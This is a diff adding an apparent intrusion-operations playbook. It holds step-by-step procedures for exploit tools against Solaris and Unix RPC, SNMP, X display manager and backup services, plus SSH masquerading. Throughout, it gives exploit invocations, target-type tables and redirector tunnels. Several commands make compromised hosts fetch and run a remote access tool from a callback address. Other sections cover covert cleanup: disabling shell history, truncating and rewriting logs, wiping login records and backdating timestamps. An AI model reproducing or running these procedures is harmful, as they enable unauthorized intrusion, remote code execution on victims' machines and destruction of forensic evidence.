@@ -1,0 +1,1229 @@
+##################################
+#       user.mission.CORE        #
+#   Core Unix Tools and Methods  #
+#        v1.4 - 20111101         #
+##################################
+
+
+#Includes:
+#	YS, GS, EASY, BL, EBB, MASQ
+#	RAT Upload
+#	Cleaning
+:/YELLOWSPIRIT
+:/YS DAIRYFARM
+:/GREENSPIRIT
+:/EASYSTREET
+:/BOSSLADD
+:/EBBSHAVE
+:/SSH MASQ
+:/RAT UPLOAD
+:/CLEANING
+:/-shell
+
+#######################
+#  YS - YELLOWSPIRIT  #
+#######################
+
+### New way:
+
+Usage: ys.auto -i TARGETIP [options]
+
+-i IP     IP of target machine (NO DEFAULT)
+-R IP     Actual target IP when redirecting via 127.0.0.1 (in case IP
+          the -scan reported is wrong in -sploit mode)
+-l IP     IP of attack machine (Default: the first active IP found in
+          this order: ppp0, ppp1, eth0 or eth1) 
+-n #      rat upload port (Default: a random port)
+-p #      Use port # for RAT listen/callback. (Default: random)
+-s #      Change delay used for -c to # seconds (must appear before -c).
+-c        Use NOPEN syntax to have RAT callback after a delay (Default
+          delay: 3 seconds)
+-z        Do NOT use uncomrpess at the either end
+-e        Do NOT use "2>&1" on target. Fouls up in some shells.
+-U        Do NOT pipe to uudecode, instead create a .uu file.
+-r rat    name of rat on target (Default: sendmail)
+-x #      port to start mini X server on (Default: random port)
+-D dir    directory to work from/create on target (Default = /tmp/.scsi)
+-P        Assume PATH=. will fail so use ./ratname
+          target, and MUST NOT use uuencode on upload.
+-a ARCH   String used to determine which architecture NOPEN server to
+          upload from /current/up/morerats/ using this (note tail -1):
+          "ls -1 ./noserver* 2>/dev/null | grep -i ${ARCH} | tail -1".
+          If not provided or no match, /current/up/noserver is assumed.
+
+NOTE: -n# and -p# can be the same, even in callback mode. ys.auto provides
+      a mechanism to allow netcat callback to finish, and its -tunnel to
+      close (if redirecting) before the NOPEN server calls back on the
+      same port.
+
+examples: 
+   ys.auto -l 19.16.1.1 -i 10.0.3.1 -n 2222 -r nscd -x 9999 -D /tmp/.dir
+   ys.auto -i 10.0.3.1
+   ys.auto -i TARGET_IP -l REDIRECTOR_IP
+
+NOTE: The only REQUIRED ARGUMENT is now -i
+
+The best way to back out of ys.auto once done (whether or not you get on
+target) is to kill off the packrat window first with ^C then ^D. Then
+kill of the xc window the same way, finally kill the ys.auto.
+
+ys.auto Version 1.4.3.1
+
+
+### Old Way:
+
+mx
+:%s/YSXSERVER_PORT//g
+:%s/YSNETCAT_PORT//g
+:%s/YSREDIR_IP//g
+:%s/YSTARGET_IP//g
+:%s/YSWORK_DIR//g
+:%s/YSRAT//g
+`x
+
+-scan xwin YSTARGET_IP
+
+### Locally:
+packrat YSNETCAT_PORT
+
+##################################################
+######  YS With REDIRECTION:
+##################################################
+###### 1. On redirector - set up nopen tunnel
+
+-tunnel
+u 177 YSTARGET_IP
+r YSXSERVER_PORT
+r YSNETCAT_PORT
+s
+
+
+###### 2. Local window1
+#./wrap-sun.sh -l 555.41.145.11 -r sendmail -p 24389 -x 39942 -d /tmp/.scsi
+#./wrap-sun.sh -l REDIR-IP -r sendmail -p NETCAT-PORT -x YSXSERVER-PORT -d /tmp/WORK-DIR
+./wrap-sun.sh -l YSREDIR_IP -r YSRAT -p YSNETCAT_PORT -x YSXSERVER_PORT -d /tmp/YSWORK_DIR
+
+	# hit return
+ 	# type y and hit return
+
+
+###### 3. Local Window2:
+        # for redirection local ip is redirector ip
+
+#./xc -x REDIR-IP -y YSXSERVER-PORT -s REDIR-IP 127.0.0.1
+#./xc -x 555.41.145.11 -y 39942 -s 555.41.145.11 127.0.0.1
+./xc -x YSREDIR_IP -y YSXSERVER_PORT -s YSREDIR_IP 127.0.0.1
+
+  	# hit return
+  	# hit return
+  	# hit return
+	# (At this point you should see a continue.... in your attack1 window
+
+	# in the attack1 window
+  	# hit return
+  	# hit return
+  	# hit return
+  
+  	# (you should see your upload happen...)
+
+### IF Exploit is successful
+# DOING THE FOLLOWING WILL GREATLY REDUCE POSSIBLE LOGGING.
+# ONLY HIT CONTINUE, IN THE MINI X SERVER WINDOW, ENOUGH
+# TIMES TO GET THE RAT FULLY UPLOADED. 
+# WATCH TCPDUMP OUTPUT TO DETERMINE WHEN RAT IS UPLOADED.
+# ONCE THE RAT IS UPLOADED, CONNECT
+# TO THE TARGET VIA THE RAT AND DO THE FOLLOWING:
+
+ps -ef | grep dtlogin
+kill PID
+
+# IF YOU SELECTED THE CORRECT dtlogin PID, THEN YOU SHOULD SEE A 
+# "connection closed" MESSAGE IN YOUR MINI X SERVER WINDOW. IF
+# NOT, YOU SELECTED THE WRONG PID AND JUST KILLED SOMEBODY ELSE'S
+# dtlogin. IF ALL GOES WELL, HIT control ^C IN THE MINI X SERVER
+# WINDOW AND THE XC WINDOW.
+
+
+	# Ctrl-C your nc window
+	# Ctrl-C your xc window
+### IF IT WORKS, JUMP:
+:/Connect to RAT
+
+##################################################
+###### YS with Double telnet / doublet method:
+##################################################
+mx
+:%s/YSRPORT1//g
+:%s/YSRPORT2//g
+`x
+
+### Redir
+-tunnel
+u 177 YSTARGET_IP
+r YSXSERVER_PORT
+r YSRPORT1
+r YSRPORT2
+r YSNETCAT_PORT
+
+
+### Local scripted (you'll type commands in this):
+#nc -l -p R-PORT1
+#nc -l -p YSRPORT1
+
+###Local scripted (your output from above will appear here):
+#nc -l -p R-PORT2
+#nc -l -p YSRPORT2
+
+### OR -- instead, use doublet in a scripted window (type and output all in same window):
+#doublet -O -t -i REDIR_IP R-PORT1
+doublet -O -t -i YSREDIR_IP YSRPORT1 YSRPORT2
+
+### then set up the tunnels as below, and use wrap-telnet.sh and xc
+
+### Scripted #1
+wrap-telnet.sh -l YSREDIR_IP -p YSRPORT1 -s YSRPORT2 -x YSXSERVER_PORT
+
+### Scripted #2
+xc -x YSREDIR_IP -y YSXSERVER_PORT -s YSREDIR_IP 127.0.0.1
+
+### Connect to RAT ###
+#w/o tunneling
+cd ../down
+../bin/noclient YSTARGET_IP
+
+#w/ tunneling. In redirector window
+-nstun YSTARGET_IP
+
+-rm YSRAT
+
+# JUMP TO CLEAN:
+:/Cleaning up
+
+##################################################
+###### YS DAIRYFARM METHOD (Windows redirect):
+##################################################
+mx
+:%s/DFWINDOWS_REDIR_IP//g
+:%s/DFTARGET_IP//g
+:%s/DFLINUX_OP_BOX_IP//g
+:%s/DFWINDOWS_OP_BOX_IP//g
+:%s/DFCONTROL_PORT//g
+:%s/DFXSERV_PORT//g
+:%s/DFNETCAT_PORT//g
+:%s/DFNOPEN_PORT//g
+:%s/DFRAT//g
+:%s/DFWORK_DIR//g
+`x
+
+### Follow steps in this order:
+### 1) on linux box, start dairyfarm client:
+
+#./df_client CONTROL-PORT 127.0.0.1:DFXSERV-PORT
+./df_client DFCONTROL_PORT 127.0.0.1:DFXSERV_PORT
+
+### 2) on windows redir, set up tunnels:
+### the next line replaces the normal tunnel to call back to the xserver port
+### and references the df control port instead
+#background redirect -tcp -implantlisten CONTROL-PORT -target LINUX-OP-BOX CONTROL-PORT -nodes 40
+background redirect -tcp -implantlisten DFCONTROL_PORT -target DFLINUX_OP_BOX_IP DFCONTROL_PORT -nodes 40
+
+### to udp 177
+#background redirect -udp -lplisten 177 -target TARGET-IP 177 -maxpacketsize 32000
+background redirect -udp -lplisten 177 -target DFTARGET_IP 177 -maxpacketsize 32000
+
+### callback for netcat upload
+#background redirect -tcp -implantlisten NETCAT-PORT -target LINUX-OPS-BOX NETCAT-PORT -nodes 40
+background redirect -tcp -implantlisten DFNETCAT_PORT -target DFLINUX_OP_BOX_IP DFNETCAT_PORT -nodes 40
+
+### callforward to nopen
+#background redirect -tcp -lplisten NOPEN-PORT -target UNIX-TARGET-IP NOPEN-PORT
+background redirect -tcp -lplisten DFNOPEN_PORT -target DFTARGET_IP DFNOPEN_PORT -bind DFWINDOWS_OP_BOX_IP
+
+### 3) on windows redir, upload dairyfarm.exe as something obscure (help16.exe) and start:
+
+put D:\OPSDisk\Tools\dairyserver.exe -name help16.exe
+matchtimes help.exe help16.exe
+
+#background run -command "help16.exe DFXSERV-PORT 127.0.0.1:CONTROL-PORT"
+background run -command "help16.exe DFXSERV_PORT 127.0.0.1:DFCONTROL_PORT"
+
+### 4) on linux, set up to launch YS, using appropriate wrap script:
+
+cd /current/up
+file noserver
+# cp appropriate noserver from morerats to /current/up
+# Need to noprep it? Different listener port (default is 32754)
+#noprep noserver -lNOPEN_PORT
+noprep noserver -lDFNOPEN_PORT
+
+#packrat RAT_NAME /current/up/noserver.new NETCAT-PORT
+packrat DFRAT /current/up/noserver.new DFNETCAT_PORT
+
+#./wrap-sun.sh -l WIN-TARGET-IP -r RAT_NAME -p NETCAT-PORT -x DFXSERV-PORT -d TMP_DIR
+./wrap-sun.sh -l DFWINDOWS_REDIR_IP -r DFRAT -p DFNETCAT_PORT -x DFXSERVER_PORT -d /tmp/DFWORK_DIR
+
+#./xc -x WIN-TARGET-IP -y DFXSERV-PORT -s WIN-TARGET-IP WINDOWS-OP-BOX
+./xc -x DFWINDOWS_REDIR_IP -y DFXSERV_PORT -s DFWINDOWS_REDIR_IP DFWINDOWS_OP_BOX_IP
+
+### 5) connect to nopen AFTER you control-c the netcat window:
+
+#noclient 192.168.254.72:32754
+noclient DFWINDOWS_OP_BOX_IP:DFNOPEN_PORT
+
+### 6) on linux, control-C the df_client window
+### 7) on windows, the dairyfarm.exe (renamed as help16.exe or whatever) should
+###    go away from the process listing;  You can now remove it from the target.
+
+-rm DFRAT
+
+
+##################################################
+######### YS With no redirection: ALMOST NEVER USED LAB ONLY
+##################################################
+### only fill in YSLOCAL_IP if NOT using redirection
+:%s/YSLOCAL_IP//g
+
+### Local Window 1:
+#./wrap-sun.sh -l LOCAL-IP -r sendmail -p NETCAT-PORT -x YSXSERVER-PORT -d /tmp/WORK-DIR
+./wrap-sun.sh -l YSLOCAL_IP -r YSRAT -p YSNETCAT_PORT -x YSXSERVER_PORT -d /tmp/YSWORK_DIR
+
+### Local Window 2:
+#./xc -x LOCAL-IP -y YSXSERVER-PORT -s LOCAL-IP TARGET-IP
+./xc -x YSLOCAL_IP -y YSXSERVER_PORT -s YSLOCAL_IP YSTARGET_IP
+
+
+
+
+###### Cleaning up ######
+### The error log file is configurable and so you must examine 
+### their xdm-config file to find out where errors are being 
+### logged.
+###
+### HAVE TO LOOK THROUGH "find" file from getscript
+
+egrep -i '(xdm-config|errors|xerror)' /current/*find*m
+
+### if no find available one of these will probably find it
+
+-ls /tmp/*errors /var/dt/*errors
+-cat error_file
+
+-grep YSREDIR_IP /var/adm/syslog /var/log/syslog /var/adm/messages
+
+-lt /var/dt/
+
+### you will notice Xerrors is the most recent
+
+-tail /var/dt/Xerrors
+
+### if your entries are the only ones there....
+
+cat /dev/null >/var/dt/Xerrors
+
+### if there are other entries you will do something like
+
+wc -l /var/dt/Xerrors
+
+### subtract the number of lines that are because of you from above
+
+head -(what's left) > t ; cat t
+
+### if it looks good:
+
+cat t > /var/dt/Xerrors
+-cat /var/dt/Xerrors
+-rm t
+
+-ls -t /var/adm
+### anything that has a reasonably current timestamp you should check
+
+### Toasting the login entries...
+### Use toast to clean utmp[x], wtmp[x], lastlog
+
+### jump to cleaning section...
+
+:/TOAST
+
+### END YS ###
+
+
+
+#######################
+#  GS - GREENSPIRIT   #
+#######################
+
+gs.auto
+Usage: gs.auto -i <rem_ip> [ options ]
+
+-i IP     IP of target machine (NO DEFAULT)
+-g opt    Change default GS option from ./ to "./opt"
+          (can be grins, frowns or sneer).
+-C str    Change default community string from public to "str".
+-l IP     IP of attack machine (Default: the first active IP found in
+          this order: ppp0, ppp1, eth0 or eth1) 
+-n #      rat upload port (Default: a random port)
+-p #      Use port # for RAT listen/callback. (Default: random)
+-s #      Change delay used for -c to # seconds (must appear before -c).
+-c        Use NOPEN syntax to have RAT callback after a delay (Default
+          delay: 0 seconds). Callback is to -l IP.
+-k        Use ksh method instead of telnet/uu*code.
+-z        Do NOT use uncomrpess at the either end
+-r rat    name of rat on target (Default: sendmail)
+-D dir    directory to work from/create on target (Default = /tmp/.scsi)
+-P        Assume PATH=. will fail so use ./ratname
+          target, and MUST NOT use uuencode on upload.
+-a ARCH   String used to determine which architecture NOPEN server to
+          upload from /current/up/morerats/ using this (note tail -1):
+          "ls -1 ./noserver* 2>/dev/null | grep -i  | tail -1".
+          If not provided or no match, /current/up/noserver is assumed.
+-G        Retry exploit--using already uploaded RAT (useful when you need
+          to try adding -P option or try another RAT callback port).
+
+examples: 
+   gs.auto -l 19.16.1.1 -i 10.0.3.1 -n 2222 -r nscd -D /tmp/.dir
+   gs.auto -i 10.0.3.1
+   gs.auto -i TARGET_IP -l REDIRECTOR_IP
+
+NOTE: The only REQUIRED ARGUMENT is now -i
+
+The best way to back out of gs.auto once done (whether or not you get on
+target) is to kill off the packrat window first with ^C then ^D.
+
+gs.auto Version 1.6.1.1
+
+
+### Or the old way:
+
+# Use sneer(2.6) or frowns(2.7+)
+gs.os.gr
+
+Using -c option requires local nosy or nopen client command as follows:
+        noxxxx -l <callbackPort>
+You'll be prompted when to start it.
+
+Usage: /current/bin/gs.os.gr [options]
+  -i <remoteIP>                (required)
+  -g <grins|frowns|sneer>      def= frowns
+  -l <localIP>                 (required)
+  -n <localPort>               (required)
+  -c <callbackPort>            (no default)
+  -D <remoteDir>               def= /tmp/.X11R6
+  -f <remoteRATName>           def= nscd
+  -E <RATenvironment vars>     (no default)
+  -A <RATarguments>            (no default)
+  -S <remoteScript>            DEPRECATED (and ignored)
+  -s <remoteScript>            DEPRECATED (and ignored)
+
+mx
+:%s/GSTARGET_IP//g
+:%s/GSPORT//g
+:%s/GSNETCAT_PORT//g
+:%s/GSREDIR_IP//g
+:%s/GSWORK_DIR//g
+:%s/GSRATNAME//g
+`x
+
+
+rpcinfo -p GSTARGET_IP
+
+rpcinfo -n GSPORT -u GSTARGET_IP 100249
+rpcinfo -n GSPORT -t GSTARGET_IP 100249
+
+# From PI
+-scan rpc GSTARGET_IP
+-scan mibiisa GSTARGET_IP
+	# should respond w/ snmp version or h/w type if mibiisa is running:
+-scan snmp1 GSTARGET_IP
+	# should give motd banner to tell you the OS
+-scan snmp2 GSTARGET_IP
+
+# If the above don't answer, GS won't work
+# if the scans answer with "No such name" then they are probably not vulnerable
+# anything else might be worth a shot as long as you're getting udp 161 to target
+
+### In netcat window:
+packrat GSRATNAME /current/up/noserver-??? GSNETCAT_PORT
+
+# Tunneling
+# on redirector
+
+-tunnel
+u 161 GSTARGET_IP
+r GSNETCAT_PORT
+s
+
+# logging depends on sneer(2.6) or frowns(2.7+)
+
+
+# With redirector:
+#./gs.os.gr -i 127.0.0.1 -g <frowns/sneer> -l REDIR-IP -n NETCAT-PORT -D /tmp/WORK-DIR -f RAT-NAME
+./gs.os.gr -i 127.0.0.1 -g <frowns/sneer> -l GSREDIR_IP -n GSNETCAT_PORT -D /tmp/GSWORK_DIR -f GSRATNAME
+ 
+# NO tunneling
+
+# Local window
+#./gs.os.gr -i TARGET-IP -g <frowns/sneer> -l REDIR-IP -n NETCAT-PORT -D /tmp/WORK-DIR -f RAT-NAME
+./gs.os.gr -i GSTARGET_IP -g <frowns/sneer> -l GSREDIR_IP -n GSNETCAT_PORT -D /tmp/GSWORK_DIR -f GSRATNAME
+
+
+# Both cases:
+#you wait 4 minutes, and you should see the upload of nopen 
+# Ctrl-C your nc
+
+### Connect to RAT on target:
+### Straight connect (no redirection)
+cd ../down
+../bin/noclient GSTARGET_IP
+
+### Connect using redirector:
+-nstun GSTARGET_IP
+
+### Cleanup:
+### run cleaner after frowns (or else another callback in 4 minutes) (might be automatic now)
+### If cleaner failed, look for and remove mibiisa_ps_data:
+rm /tmp/mibiisa_ps_data
+
+### toast utmp, wtmp, utmpx, wtmpx
+:/TOAST
+
+### TO ENSURE CLEANER WORKED:
+### Remove directory created under /tmp and WAIT 4 MINUTES...if directory is not re-created, cleaner worked
+-rm GSWORK_DIR
+
+### END GS ###
+
+
+#######################
+#  EASY - EASYSTREET  #
+#######################
+
+### cmsd 100068
+### UDP is best since it's a single packet to exploit
+
+mx
+:%s/ESTARGET_IP//g
+`x
+
+# look for 100068 and make note of port
+-scan rpc ESTARGET_IP
+
+### with -sploit:
+
+#-sploit will ask you which exploit to try.
+# Select 'CM' (calendar manager)
+# Another window will pop up to run the exploit
+# This window will pause to allow you to verify the command it will run.
+# The command should look something like this (the ports will vary):
+#     -u 32778 -i 127.0.0.1 -l 192.168.250.3 -r sendmail -D /tmp/.scsi -n 26120 -c
+# Append '-T 2' to the front of the line so that it looks like this:
+#      -T 2 -u 32778 -i 127.0.0.1 -l 192.168.250.3 -r sendmail -D /tmp/.scsi -n 26120 -c
+# Then press return.
+
+# The exploit window will prompt you to set up a listener like this:
+# You must establish a NOPEN listener on 192.168.250.3:SOME_RANDOM_PORT
+
+-nrtun RANDOM (as indicated in the -sploit exploit prompt)
+
+#Press enter
+
+#Now the exploit will occur and, after a couple of minutes, it will call back
+#to your listener.
+#Once the callback occurs, take the following steps:
+
+#In a local window
+LOCAL>closetunnel
+
+#Press 'A' to abort the autodone commands
+#Delete the files created by your exploit
+#There should be one lock file and one callog file
+-lt /var/spool/calendar
+-rm /var/spool/calendar/THE_TWO_MOST_RECENT_FILES
+
+#Use touch to set the directory timestamp back
+-lt /var/spool
+-touch /var/spool/SOME_OLDER_DIRECTORY /var/spool/calendar
+
+
+### Usage:
+./cmsex
+./cmsex.auto
+
+EASYSTREET version 1.2
+Usage: cmsex -i <ip_addr/hostname> -c <command> -T <target_type> (-u <port> | -t <port>) 
+
+-i target ip address / hostname 
+-c command
+-T target type
+-u UDP port (use 0 to query portmapper)
+-t TCP port (use 0 to query portmapper)
+
+Target types:
+0: Solaris 8 Blade-1000s and Ultra-60s
+1: Solaris 9 Blade-1000s and Ultra-60s
+2: Solaris 6,7,and 8 Ultras           
+3: Solaris 6 - 8 SPARCstations        
+4: Solaris 9 Ultra-30s                
+5: Solaris 6 - 7 x86                  
+6: Solaris 8 x86                      
+7: Solaris 9 x86 (not implemented)    
+8: HPUX  (not implemented)            
+9: SCO 7.0.1 x86                      
+
+Note: Choosing the correct target type is a bit of guesswork.
+      If one choice fails, you may want to try another.
+
+# Only use ESLOCAL_IP if NOT REDIRECTING cmsex command
+mx
+:%s/ESWORK_DIR//g
+:%s/ESLOCAL_IP/ESLOCAL_IP/g
+:%s/ESREDIR_IP//g
+:%s/ESNETCAT_PORT//g
+:%s/ESCMSD_PORT//g
+:%s/ESRANDOM//g
+`x
+
+### get nopen ready
+packrat 
+
+
+### no redirection
+#./cmsex -i TARGET_IP -c 'mkdir /tmp/.scsi; cd /tmp/.scsi && telnet ESLOCAL_IP ESNETCAT_PORT | uudecode && uncompress sendmail.Z && PATH=. sendmail' -T <target_type> (-u | -t) CMSD-PORT
+
+./cmsex -i ESTARGET_IP -c 'mkdir /tmp/ESWORK_DIR; cd /tmp/ESWORK_DIR && telnet ESLOCAL_IP ESNETCAT_PORT | uudecode && uncompress sendmail.Z && PATH=. sendmail' -T <target_type> (-u | -t) ESCMSD_PORT
+
+
+### Redirected:
+-tunnel
+u ESRANDOM ESTARGET_IP ESCMSD_PORT
+r ESNETCAT_PORT
+
+#./cmsex -i 127.0.0.1 -c 'mkdir /tmp/.scsi; cd /tmp/.scsi && telnet REDIR_IP NETCAT_PORT | uudecode && uncompress sendmail.Z && PATH=. sendmail' -T 3 -u RANDOM
+./cmsex -i 127.0.0.1 -c 'mkdir /tmp/ESWORK_DIR; cd /tmp/ESWORK_DIR && telnet ESREDIR_IP ESNETCAT_PORT | uudecode && uncompress sendmail.Z && PATH=. sendmail' -T 3 -u ESRANDOM
+
+
+### when the upload is done, kill the netcat, then try connecting in
+
+-nstun ESTARGET_IP
+
+-rm sendmail
+
+
+### Logging:
+-lt /var/adm
+-lt /var/spool/calendar
+
+### END EASY ###
+
+
+
+#######################
+#    BL - BOSSLADD    #
+#######################
+### when nsrexec is there but NOT with nsrstatd???
+### like a tcp version of BS
+### always uses port 7937
+
+
+### ./bll.tnc.gr 
+
+# Before running this script, you first need to run the following:
+#      nc -l -p localPort < file2Xfer&Run.uu
+#      (nc must be in your path; it's also run w/in this script)
+# where file2Xfer&Run.uu is a compressed, uuencoded file.
+
+
+# Usage: bll.tnc.gr 
+# [options] -- [options to <file2Xfer&Run>]
+#  -i <target ip>               (required)
+#  -l <callback ip>             (required)
+#  -p <callback port>           def = 32177
+#  -f <file2Xfer&Run>           (required)
+#  -D <remoteDir>               def= /tmp/.X11R6
+#
+
+# ./bll.tnc.gr -i 66.128.32.67 -l 67.233.61.230 -p 24792 -f sendmail -D /tmp/.scsi
+
+mx
+:%s/BLNETCAT_PORT//g
+:%s/BLTARGET_IP//g
+:%s/BLREDIR_IP//g
+:%s/BLRAT_NAME//g
+:%s/BLWORK_DIR//g
+`mx
+
+packrat BLNETCAT_PORT
+
+### On redirector:
+-tunnel
+l 7937 BLTARGET_IP
+r BLNETCAT_PORT
+
+### On local machine:
+### Ex.:  ./bll.tnc.gr -i 127.0.0.1 -l 150.27.1.11 -p 45226 -f sendmail -D /tmp/.scsi
+###./bll.tnc.gr -i 127.0.0.1 -l REDIR_IP -p NETCAT_PORT -f RAT_NAME -D /tmp/WORK_DIR
+
+./bll.tnc.gr -i 127.0.0.1 -l BLREDIR_IP -p BLNETCAT_PORT -f BLRAT_NAME -D /tmp/BLWORK_DIR
+
+###  Once upload of RAT completes, connect to target from PI with nopen:
+
+-nstun BLTARGET_IP
+
+### Cleanup
+-ls /nsr/cores
+-ls /nsr/cores/sh
+-cat /nsr/cores/sh/*
+rm /nsr/cores/sh/*
+-rm /nsr/cores/sh
+-touch SOMEFILE /nsr/cores
+
+-ls /nsr/logs
+-ls /nsr/logs/daemon.log
+-get /nsr/logs/daemon.log
+wc -l /nsr/logs/daemon.log
+head -## /nsr/logs/daemon.log > n
+-cat n
+cat n > /nsr/logs/daemon.log
+touch SOMEFILE /nsr/logs/daemon.log
+
+### END BL ###
+
+
+#######################
+#   EBB - EBBSHAVE    #
+#######################
+### Sol2.10 vulnerable for program 100230 metamhd, use Option #1 (5.9 metamhd)
+### ./ebbshave.v5 is a wrapper program for ebbnew_linux exploit for Sparc Solaris RPC services
+### Important: ebbnew_linux must be in your PATH
+
+#command that is useful:
+#rpcinfo -n <PORT NUM> -u|-t <TARGET_IP> <PROGRAM NUM>
+
+usage: ./ebbshave.v5 -o -v -t -p
+-o : one of the following options [1-19]:
+        1, "5.9 metamhd", program # = 100230, NOTE - this works for same program on Sol2.10
+        2, "5.8 ruserd", program # = 100002, NOTE = version 1
+        3, "5.8 ruserd", program # = 100002, NOTE = version 2 - must start service first by using rpcinfo -n before using this option
+        4, "5.8 ttdbserverd", program # = 100083,
+        5, "5.8 cachefsd", program # = 100235, NOTE = version 1 - Start with option #6 first, if it fails then try this option
+        6, "5.8 cachefsd", program # = 100235, NOTE = version 2 - must start service first by using rpcinfo -n before using this option
+        7, "5.8 metad", program # = 100229, NOTE = version 1
+        8, "5.8 metad", program # = 100229, NOTE = version 2 - must start service first by using rpcinfo -n before using this option
+        9, "5.8 metamhd", program # = 100230,
+        10, "5.7 ruserd", program # = 100002, NOTE = must start service first by using rpcinfo -n before using this option
+        11, "5.7 kcms_server", program # = 100221,
+        12, "5.7 cachefsd", program # = 100235,
+        13, "5.7 ttdbserverd", program # = 100083,
+        14, "5,7 dr_daemon", program # = 300326,
+        15, "5.6 ruserd", program # = 100002,
+        16, "5.6 kcms_server", program # = 100221,
+        17, "5.6 cachefsd", program # = 100235, NOTE = version 1 - Start with option #18 first, if it fails then try this option
+        18, "5.6 cachefsd", program # = 100235, NOTE = version 2 - must start service first by using rpcinfo -n before using this option
+        19, "5.6 ttdbserverd", program # = 100083,
+-v : the program version number you are exploiting which is obtained from rpcinfo output
+-t : targets ip address
+-p : port number rpc program is listening on
+example:
+        ./ebbnew_linux.wrapper -o 2 -v 2 -t 192.168.10.4 -p 32772
+
+If you fail to exploit using ./ebbshave.v5, try bruteforcing using ebbshave.v4
+
+
+mx
+:%s/EBBTARGET_IP//g
+:%s/EBBRANDOM//g
+:%s/EBBPORT//g
+:%s/EBBPROG//g
+:%s/EBBNETCAT_PORT//g
+:%s/EBBREDIR_IP//g
+:%s/EBBWORK_DIR//g
+:%s/EBBRAT_PORT//g
+`x
+
+### 1.  Use the following command to look for a suitable program to hit
+
+-scan brpc EBBTARGET_IP
+
+### Local box:
+./ebbshave.v5
+
+### 2.  Verify the portnum will work (should respond "ready and waiting) 
+### Use either:
+# rpcinfo -n <PORT NUM> -u|-t <TARGET_IP> <PROGRAM NUM>
+# Ex.:  ebbshave -n 32776 -t targetip 100229
+
+### Redirector:
+-tunnel
+[l or u] EBBRANDOM EBBTARGET_IP EBBPORT
+
+### Local:
+rpcinfo -n EBBRANDOM -u|-t 127.0.0.1 EBBPROG
+
+
+###### 3.  Plug in your choices and go:
+
+### Netcat window:
+packrat EBBNETCAT_PORT
+
+
+### Add to Existing Redirector tunnels:
+r EBBNETCAT_PORT
+
+### Locally:
+
+./ebbshave.v5 -o <OS OPTION> -v <VERSION FROM RPCINFO> -t 127.0.0.1 -p EBBRANDOM
+
+### IF SUCCESSFUL - skip down to unsets
+###IF ebbshave.v5 fails
+### Locally:
+
+./ebbshave.v4
+
+#ebbshave -B -T OPTION -n PORTNUM -t 127.0.0.1 PROGNUM
+#./ebbshave.v4 -n <PORT> -t 127.0.0.1 <PROGRAM> <VERSION>
+# To throw it:
+./ebbshave.v4 -T <TARG_NUM> -n EBBRANDOM -t 127.0.0.1 EBBPROG <VERSION FROM RPCINFO>
+
+
+### If successful, you should get a root shell
+
+### Get the following ready for pasting: (paste one line at a time)
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+cd /tmp
+mkdir EBBWORK_DIR
+cd /tmp/EBBWORK_DIR
+pwd
+telnet EBBREDIR_IP EBBlNETCAT_PORT < /dev/console | uudecode;ls -la
+uncompress sendmail.Z
+netstat -an | grep EBBRAT_PORT
+D="-lEBBRAT_PORT" PATH=. sendmail
+
+### pitch window
+-nstun EBBTARGET_IP EBBRAT_PORT
+
+
+###### Cleanup:
+/usr/openwin/bin/core
+/var/adm/messages
+
+#on 5.10+:
+/etc/svc/volatile/svc:/network/rpc
+
+Other cores locations?
+Always look at utmp, wtmp,etc
+
+
+
+####### If you've hit this before and know the addresses:
+
+# Ex.:  ./ebbshave -T 1 -S 0xffbefa20 -E 0xffbefa20 -n 32775 -t target 300326
+
+### END EBB ###
+
+
+
+#######################
+#   MASQ - SSH MASQ   #
+#######################
+
+mx
+:%s/MASQTARGET_IP//g
+:%s/MASQTUNNEL_PORT//g
+:%s/MASQUSER//g
+`x
+
+### on redirector
+-tunnel
+l MASQTUNNEL_PORT MASQTARGET_IP 22
+
+
+# Multiple targets? If so, wipe your known_hosts file locally between each:
+cat /dev/null > ~/.ssh/known_hosts
+
+### DIRECT?? NO WE GENERALLY DO NOT WANT THIS :  ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  -v -x MASQUSER@MASQTARGET_IP "/bin/sh"
+	# or
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -v -x -p MASQTUNNEL_PORT MASQUSER@127.0.0.1 /bin/sh
+	# or this eliminates the lack of tty problem
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -v -x -p MASQTUNNEL_PORT MASQUSER@127.0.0.1
+
+### Want tunnels? (for NOPEN, for file transfers....)
+###
+### Use the following lines to set up an ssh tunnel.  The reverse tunnel can be used to pull up a rat,
+### while the forward tunnel can be used to connect with noclient. This could be particularly useful
+### if SSH is the only access method to the target. Both can be used simultaneously.
+### NOTE: the -R commands WILL CREATE BOUND PORTS on target, be careful.
+###
+## FORWARD TUNNEL OPTION:  (use actual target IP unless 127.0.0.1 might blend better)
+##                          -L LOCAL_PORT:TARGET_IP:TARGET_PORT
+## REVERSE TUNNEL OPTION:   -R REMOTE_PORT:LOCAL_IP:LOCAL_PORT
+
+# NEW (who knew? apr 2011): With a full tty login (not with /bin/sh), you can get to a ssh command shell
+# with the key sequence:    CR-CR-~-C   (return twice, tilde, capital C).
+
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+w
+id
+uname -a
+ps -ef
+ls -lart /tmp
+mount
+mkdir /tmp/.scsi;cd /tmp/.scsi;pwd
+which uudecode uncompress wget perl
+        # gedit sendmail
+uudecode; ls -la
+
+
+# LINUX:
+# start nopen so you can upload forkpty to be able to su (ptrace didn't work)
+-put forkpty f
+./f
+
+# or:
+su
+
+# SEE RAT UPLOADS
+:/RAT UPLOAD
+
+### OR ###
+### SSH TUNNEL
+### set up a reverse SSH TUNNEL to use with RAT UPLOAD
+### or a forward tunnel for noclient connection (or both)
+
+mx
+:%s/MASQTARGET_IP//g
+:%s/MASQTUNNEL_PORT//g
+:%s/MASQUSER//g
+:%s/REMOTEONE/REMOTEONE/g
+:%s/LOCALONE/LOCALONE/g
+:%s/REMOTETWO/REMOTETWO/g
+:%s/LOCALTWO/LOCALTWO/g
+:%s/TUNRATNAME/TUNRATNAME/g
+`x
+
+### on redirector
+-tunnel
+l MASQTUNNEL_PORT MASQTARGET_IP 22
+
+### LOCAL:
+
+nc -v -l -p LOCALONE < /current/up/noserver
+
+### Use the following lines to set up an ssh tunnel.  The reverse tunnel can be used to pull up a rat,
+### while the forward tunnel can be used to connect with noclient. This could be particularly useful
+### if SSH is the only access method to the target. Both can be used simultaneously.
+### NOTE: the -R commands WILL CREATE BOUND PORTS on target, be careful.
+
